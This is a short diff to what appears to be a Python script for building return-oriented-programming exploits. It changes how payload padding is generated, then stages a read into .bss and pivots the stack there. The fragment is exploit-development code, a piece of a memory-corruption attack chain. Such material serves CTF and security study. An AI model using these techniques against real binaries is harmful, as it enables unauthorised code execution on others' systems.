@@ -6,7 +6,7 @@ offset = int(sys.argv[2])
 rop = ROP(fpath)
 addr_stage = rop.section('.bss') + 0x400
 
-buf = rop.fill(offset)
+buf = rop.retfill(offset)
 buf += rop.call_plt('read', 0, addr_stage, 100)
 buf += rop.pivot(addr_stage)
 
